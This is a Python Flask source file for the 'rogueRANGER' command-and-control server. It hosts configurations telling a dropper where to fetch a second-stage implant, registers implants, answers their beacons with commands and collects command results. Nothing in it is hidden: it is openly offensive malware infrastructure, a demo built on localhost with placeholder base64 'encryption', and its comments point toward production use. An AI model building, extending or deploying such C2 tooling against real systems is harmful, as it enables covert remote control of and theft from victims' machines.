#!/usr/bin/env python3
"""
Simple Configuration Server for rogueRANGER Phase 1
Hosts encrypted C2 configurations for dropper retrieval
"""

from flask import Flask, request, jsonify
import json
import base64
import time
import hashlib
from cryptography.fernet import Fernet

app = Flask(__name__)

# In-memory store for configurations
config_store = {}
implant_registry = {}

class ConfigServer:
    """Manages encrypted configurations for implants"""
    
    def __init__(self):
        self.configs = {}
        self.public_keys = {}
        
    def generate_config(self, implant_id, stage2_url):
        """Generate encrypted configuration for an implant"""
        # In production, this would use KeyManager
        # For demo, we'll use a simple approach
        
        config = {
            'stage2_url': stage2_url,
            'encryption_key': Fernet.generate_key().decode('utf-8'),
            'implant_id': implant_id,
            'c2_host': 'localhost',
            'c2_port': 4444,
            'timestamp': time.time(),
            'ttl': 86400  # 24 hours
        }
        
        # "Encrypt" with simple base64 for demo
        # In production, use implant-specific key derivation
        config_json = json.dumps(config)
        encrypted = base64.b64encode(config_json.encode()).decode('utf-8')
        
        self.configs[implant_id] = {
            'config': encrypted,
            'created': time.time(),
            'expires': time.time() + 86400
        }
        
        print(f"[CONFIG] Generated config for {implant_id}")
        return encrypted
    
    def register_implant(self, implant_id, public_key):
        """Register implant with its public key"""
        self.public_keys[implant_id] = public_key
        print(f"[CONFIG] Registered implant {implant_id}")
        return True
    
    def get_config(self, implant_id):
        """Get configuration for implant"""
        if implant_id in self.configs:
            config_data = self.configs[implant_id]
            
            # Check if expired
            if time.time() > config_data['expires']:
                print(f"[CONFIG] Config expired for {implant_id}")
                del self.configs[implant_id]
                return None
            
            return config_data['config']
        
        return None

# Create server instance
server = ConfigServer()

@app.route('/')
def index():
    """Server status"""
    return jsonify({
        'status': 'online',
        'configs_stored': len(server.configs),
        'implants_registered': len(server.public_keys)
    })

@app.route('/config/<implant_id>')
def get_config(implant_id):
    """Get encrypted configuration for implant"""
    config = server.get_config(implant_id)
    
    if config:
        return config, 200, {'Content-Type': 'text/plain'}
    else:
        return "Configuration not found or expired", 404

@app.route('/generate', methods=['POST'])
def generate_config():
    """Generate new configuration"""
    data = request.json
    implant_id = data.get('implant_id')
    stage2_url = data.get('stage2_url', 'http://localhost:8000/stage2.py')
    
    if not implant_id:
        return jsonify({'error': 'implant_id required'}), 400
    
    config = server.generate_config(implant_id, stage2_url)
    return jsonify({'config': config})

@app.route('/register', methods=['POST'])
def register_implant():
    """Register implant with public key"""
    data = request.json
    implant_id = data.get('implant_id')
    public_key = data.get('public_key')
    
    if not implant_id or not public_key:
        return jsonify({'error': 'implant_id and public_key required'}), 400
    
    success = server.register_implant(implant_id, public_key)
    return jsonify({'success': success})

@app.route('/beacon', methods=['POST'])
def handle_beacon():
    """Handle implant beacon (simplified)"""
    # In production, this would decrypt and process the beacon
    beacon_data = request.get_data()
    
    # Simulate processing
    print(f"[BEACON] Received beacon: {len(beacon_data)} bytes")
    
    # Return mock commands
    response = {
        'commands': [
            {
                'id': 'cmd_001',
                'type': 'recon',
                'payload': {}
            }
        ]
    }
    
    # "Encrypt" response
    encrypted_response = base64.b64encode(json.dumps(response).encode())
    return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}

@app.route('/result', methods=['POST'])
def handle_result():
    """Handle command execution result"""
    result_data = request.get_data()
    print(f"[RESULT] Received result: {len(result_data)} bytes")
    
    # In production, decrypt and log result
    try:
        decoded = base64.b64decode(result_data).decode('utf-8')
        result = json.loads(decoded)
        print(f"[RESULT] Command {result.get('command_id')}: {result.get('success')}")
    except:
        print("[RESULT] Could not decode result")
    
    return jsonify({'received': True})

def create_test_configs():
    """Create test configurations for demonstration"""
    test_implant_id = "test_implant_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    # Generate a test config
    config = server.generate_config(
        test_implant_id,
        "http://localhost:8000/rogue_implant_enhanced.py"
    )
    
    print(f"\n=== TEST CONFIGURATION ===")
    print(f"Implant ID: {test_implant_id}")
    print(f"Config URL: http://localhost:5000/config/{test_implant_id}")
    print(f"Registration: POST to http://localhost:5000/register")
    print(f"Beacon: POST to http://localhost:5000/beacon")
    print("==========================\n")
    
    return test_implant_id

if __name__ == "__main__":
    # Create test config on startup
    test_id = create_test_configs()
    
    print(f"[CONFIG SERVER] Starting on http://localhost:5000")
    print(f"[CONFIG SERVER] Test implant ID: {test_id}")
    print("[CONFIG SERVER] Use Ctrl+C to stop\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)